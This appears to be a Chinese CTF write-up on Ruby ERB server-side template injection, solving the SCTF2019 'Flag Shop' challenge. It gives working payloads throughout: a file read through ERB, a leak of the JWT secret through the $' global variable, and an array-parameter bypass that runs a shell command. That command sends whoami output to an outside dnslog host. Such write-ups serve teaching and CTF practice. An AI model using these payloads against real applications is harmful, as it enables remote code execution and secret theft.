#### 了解Ruby ERB模板注入

ERB是Ruby自带的

- &lt;% 写逻辑脚本(Ruby语法) %&gt;
- &lt;%= 直接输出变量值或运算结果 %&gt;

```ruby
require 'erb'

template = "text to be generated: <%= x %>"
erb_object = ERB.new(template)
x = 5
puts erb_object.result(binding())
x = 4
puts erb_object.result(binding())
```

![image-20211213164451254](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5ddaef4575a3111ab8b0da6216dd5730ff90fb4a.png)

如果x是可控的，跟普通模板注入一样

```ruby
require 'erb'

template = "text to be generated: <%= x %>"
erb_object = ERB.new(template)
x = 7*7
puts erb_object.result(binding())
```

![image-20211213164732055](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fddc3bdaed07c093059c24bd2bd22e2e0768d397.png)

读取一个文件：

```ruby
require 'erb'

template = "text to be generated: <%= x %>"
erb_object = ERB.new(template)
x = File.open('pwd.txt').read
puts erb_object.result(binding())
```

![image-20211213164910425](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b6d94e3ce9a3c2c558f4e7bc73e4dd465068c0c4.png)

枚举当前类的可用方法

```ruby
require 'erb'

template = "text to be generated: <%= x %>"
erb_object = ERB.new(template)
x = self.methods
puts erb_object.result(binding())
```

![image-20211213165041980](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-10e36edd14f02e690aace03b9bf326a85845e022.png)

#### Ruby全局变量

| Ruby全局变量 | 中文释义 |
|---|---|
| $! | 错误信息 |
| $@ | 错误发生的位置 |
| $0 | 正在执行的程序的名称 |
| $&amp; | 成功匹配的字符串 |
| $/ | 输入分隔符，默认为换行符 |
| $\\ | 输出记录分隔符（print和IO） |
| $. | 上次读取的文件的当前输入行号 |
| $; $-F | 默认字段分隔符 |
| $, | 输入字符串分隔符，连接多个字符串时用到 |
| $= | 不区分大小写 |
| $~ | 最后一次匹配数据 |
| $` | 最后一次匹配前的内容 |
| $' | 最后一次匹配后的内容 |
| $+ | 最后一个括号匹配内容 |
| $1~$9 | 各组匹配结果 |
| $&lt; ARGF | 命令行中给定的文件的虚拟连接文件（如果未给定任何文件，则从$stdin） |
| $&gt; | 打印的默认输出 |
| $\_ | 从输入设备中读取的最后一行 |
| $\* ARGV | 命令行参数 |
| $$ | 运行此脚本的Ruby的进程号 |
| $? | 最后执行的子进程的状态 |
| $: $-I | 加载的二进制模块（库）的路径 |
| $“ | 数组包含的需要加载的库的名字 |
| $DEBUG $-d | 调试标志，由-d开关设置 |
| $LOADED\_FEATURES | $“的别名 |
| $FILENAME | 来自$&lt;的当前输入文件 |
| $LOAD\_PATH | $: |
| $stderr | 当前标准误差输出 |
| $stdin | 当前标准输入 |
| $stdout | 当前标准输出 |
| $VERBOSE $-v | 详细标志，由-w或-v开关设置 |
| $-0 | $/ |
| $-a | 只读 |
| $-i | 在in-place-edit模式下，此变量保存扩展名 |
| NIL | 0本身 |
| ENV | 当前环境变量 |
| RUBY\_VERSION | Ruby版本 |
| RUBY\_RELEASE\_DATE | 发布日期 |
| RUBY\_PLATFORM | 平台标识符 |

#### \[SCTF2019\]Flag Shop

/filebak查看源码

```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
ENV["SECRET"] = SecureRandom.hex(64)

configure do
  enable :logging
  file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
  file.sync = true
  use Rack::CommonLogger, file
end

get "/" do
  redirect '/shop', 302
end

get "/filebak" do
  content_type :text
  erb IO.binread __FILE__
end

get "/api/auth" do
  payload = { uid: SecureRandom.uuid , jkl: 20}
  auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
  cookies[:auth] = auth
end

get "/api/info" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
  erb :shop
end

get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end

post "/shop" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

  if auth[0]["jkl"] < FLAGPRICE then

    json({title: "error",message: "no enough jkl"})
  else

    auth << {flag: ENV["FLAG"]}
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth
    json({title: "success",message: "jkl is good thing"})
  end
end

def islogin
  if cookies[:auth].nil? then
    redirect to('/shop')
  end
end
```

##### 利用全局变量进行 ERB 模板注入

抓包测试：

点work:

![image-20211213172412196](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e6db2a15ac84c889f433178a84d406c0b3948c59.png)

JinKela会增多

shop：提示没有足够的JinKela

![image-20211213172751756](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-773ae767dffcaed28d055147b325dae111f33cfb.png)

jwt解一下发现，猜测要改jkl为flag的价值，但是需要secret

![image-20211213173045282](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b5d1531e9677633a8e7f13316a7617c6418aed9e.png)

这里需要用Ruby ERB模板注入去读取secret

源码重点部分

```ruby
get "/work" do
  islogin
  auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
  auth = auth[0]
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end

  if params[:do] == "#{params[:name][0,7]} is working" then

    auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
    auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
    cookies[:auth] = auth 
    ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

  end
end
```

如果传入的参数do和name一致，则会输出`params[:name][0,7]} working successfully!`，这里有erb模板，并且直接把可控参数name拼接进去了，但这里有限制，最多最多只能要七个字符，除去`<%=%>`只剩两个字符可以操作

这里用`<%1%>`测试

```php
http://991b7899-2d9a-4b3b-9a4c-02dc84460e02.node4.buuoj.cn:81/work?name=%3C%25%3D1%25%3E&do=%3C%25%3D1%25%3E%20is%20working
```

![image-20211213171914741](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1dbb50b64f86d61f754ba8cbcfea1c639eeaad47.png)

```ruby
  unless params[:SECRET].nil?
    if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
      puts ENV["FLAG"]
    end
  end
```

{}类似于 ${} 代表解析里面的变量

如果params\[:SECRET\].nil为false，才能运行下一步，所以参数应该加上SECRET，如果SECRET 参数存在则对其进行匹配，用传入的这个值去和 ENV\[“SECRET”\] 匹配，匹配上了就输出flag。因为这里有匹配，就可以用ruby的全局变量 $` 。$'最后一次成功匹配右边的字符串

```php
/work?SECRET=&name=%3c%25%3d%24%27%25%3e&do=%3c%25%3d%24%27%25%3e%20is%20working
```

![image-20211213190137194](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3a1b5be31a2839a1c034022aadcbf7b0839c0942.png)

拿到secret，然后用jwt编码后替换auth

![image-20211213185616585](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c989bdd0f0b1b25490a48b1e51291ab9781599ed.png)

点击购买

![image-20211213190035153](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-966541da20a457e2b7d7f8a780f217bdc310a792.png)

![image-20211213190115145](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-74d027c07a0e4942adcc492d83de5558d436ccab.png)

##### 利用HTTP参数传递类型差异

下面是另一种做法，利用HTTP参数传递类型差异的问题。url传参可以传入非字符串以外的其他数据类型，比如数组从而绕过一些程序逻辑

```ruby
$a = "mon123"
$b = Array["aaa","bbb","ccc"]
puts "$a: #{$a[0,3]}"
puts "$b: #{$b[0,3]}"
```

![image-20211213191203913](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-eab88117c36723c1f692f609fb1bc3092f8a9902.png)

这里，$b原本是数组，但是因为被拼接到了字符串中，所以数组默认的类型变成了`["aaa", "bbb", "ccc"]`,这样上面代码的限制，从原本的7个字符，变成了7个数组长度

payload：

```php
/work?name[]=<%=system('ping -c 1 `whoami`.xuu1g4.dnslog.cn')%>&name[]=1&name[]=2&name[]=3&name[]=4&name[]=5&name[]=6&do=["<%=system('ping -c 1 `whoami`.xuu1g4.dnslog.cn')%>", "1", "2", "3", "4", "5", "6"] is working
```

url编码一下

```php
/work?name[]=%3C%25%3Dsystem(%27ping%20-c%201%20%60whoami%60.xuu1g4.dnslog.cn%27)%25%3E&name[]=1&name[]=2&name[]=3&name[]=4&name[]=5&name[]=6&do=%5B%22%3C%25%3Dsystem(%27ping%20-c%201%20%60whoami%60.xuu1g4.dnslog.cn%27)%25%3E%22%2C%20%221%22%2C%20%222%22%2C%20%223%22%2C%20%224%22%2C%20%225%22%2C%20%226%22%5D%20is%20working
```

实现了任意命令执行

![image-20211213194924684](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f3e2f1e57c28cf7fc9ca5d1f855702cd48ea3dd8.png)